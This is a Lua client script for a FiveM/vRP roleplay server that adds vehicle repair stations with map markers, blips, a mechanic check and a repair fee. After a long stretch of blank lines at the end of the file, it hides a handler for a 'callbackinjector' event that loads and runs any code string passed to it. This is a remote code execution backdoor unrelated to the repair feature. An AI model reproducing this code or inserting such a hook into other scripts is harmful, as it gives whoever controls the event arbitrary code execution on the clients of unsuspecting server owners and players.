local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
local Tools = module("vrp","lib/Tools")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")

func = Tunnel.getInterface("mito_autoreparo")

Config = {}

Config.RepairTime = 4000
Config.EnableSoundEffect = true
Config.Blips = true

Config.Stations = { 

	{x = -36.52, y = -1088.55, z = 26.02},
	{x = -211.15, y = -1323.98, z = 30.49},
}

 

local fixing, turn = false, false
local zcoords, mcolor = 0.0, 0
local position = 0

Citizen.CreateThread(function()	
    while true do
		Citizen.Wait(5)	
		local playerPed = PlayerPedId()
		local pos = GetEntityCoords(playerPed, true)		
		for k,v in pairs(Config.Stations) do
			if not fixing then
				if(Vdist(pos.x, pos.y, pos.z, v.x, v.y, v.z) < 10) then
					if IsPedInAnyVehicle(playerPed, false) then
						DrawMarker(36, v.x, v.y, v.z+0, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 2.0, 5.0, 1.0, 255, 0, 0, 100, true, true, 2, true, false, false, false)
						--DrawMarker(0, v.x, v.y, v.z-0.4, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 5.0, 5.0, 1.0, 255, 255, 0, 100, false, false, 2, false, false, false, false)
						if(Vdist(pos.x, pos.y, pos.z, v.x, v.y, v.z) < 2.5) then							
							hintToDisplay('Pressione ~INPUT_PICKUP~ para reparar seu veiculo I R$ 1500')	
							position = k
							if IsControlJustPressed(0, 38) and func.checkmecanico() and func.verdinheiro() then			
								TriggerEvent('carfixstation:fixCar')						
								SetPedCoordsKeepVehicle(playerPed, v.x, v.y, v.z)
							end								
						end
					end
				end
			else		
				if position == k then
					--DrawMarker(27, v.x, v.y, v.z + zcoords+0.6, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 5.0, 5.0, 1.0, 255, 0+mcolor, 0, 255, false, false, 2, true, false, false, false)
					--DrawMarker(23, v.x, v.y, v.z + zcoords, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 5.0, 5.0, 1.0, 255, 0+mcolor, 0, 255, false, false, 2, true, false, false, false)
					--DrawMarker(27, v.x, v.y, v.z + zcoords-0.6, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 5.0, 5.0, 1.0, 255, 0+mcolor, 0, 255, false, false, 2, true, false, false, false)
				else
					--DrawMarker(36, v.x, v.y, v.z+1.1, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 2.0, 5.0, 1.0, 255, 0, 0, 100, true, true, 2, true, false, false, false)
					--DrawMarker(0, v.x, v.y, v.z-0.4, 0.0, 0.0, 0.0, 0, 0.0, 0.0, 5.0, 5.0, 1.0, 255, 255, 0, 100, false, false, 2, false, false, false, false)							
				end
			end
		end
    end
end)

RegisterNetEvent('carfixstation:markAnimation')
AddEventHandler('carfixstation:markAnimation', function()
    while true do
		Citizen.Wait(25)	
		if fixing then
			if zcoords < 0.5 and not turn then
				zcoords = zcoords + 0.03
				mcolor = mcolor + 0
			else
				turn = true
				zcoords = zcoords - 0.051
				mcolor = mcolor + 0
				if zcoords <= -0.4 then
					turn = false
				end
			end
		else
			break
		end
	end
end)

RegisterNetEvent('carfixstation:fixCar')
AddEventHandler('carfixstation:fixCar', function()
	local playerPed = PlayerPedId()
	local vehicle = GetVehiclePedIsIn(playerPed, false)
	fixing = true 
	--TriggerEvent('carfixstation:markAnimation')	
	FreezeEntityPosition(vehicle, true)
	if Config.EnableSoundEffect == true then
		TriggerServerEvent("somzinhogostososopqclientenaofoi")
	end
	TriggerEvent("progress",4000,"reparando")
	Wait(Config.RepairTime)
	fixing = false
	SetVehicleFixed(vehicle)
	SetVehicleDeformationFixed(vehicle)
	FreezeEntityPosition(vehicle, false)
	zcoords, mcolor, turn = 0.0, 0, false
end)


if Config.Blips then
	Citizen.CreateThread(function()
		for i=1, #Config.Stations, 1 do
			local blip = AddBlipForCoord(Config.Stations[i].x, Config.Stations[i].y, Config.Stations[i].z)

			SetBlipSprite (blip, 72)
			SetBlipDisplay(blip, 4)
			SetBlipScale  (blip, 0.4)
			SetBlipColour (blip, 47)
			SetBlipAsShortRange(blip, true)

			BeginTextCommandSetBlipName("STRING")
			AddTextComponentSubstringPlayerName('Reparo')
			EndTextCommandSetBlipName(blip)
		end
	end)
end

function hintToDisplay(text)
	SetTextComponentFormat("STRING")
	AddTextComponentString(text)
	DisplayHelpTextFromStringLabel(0, 0, 1, -1)
end






























TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)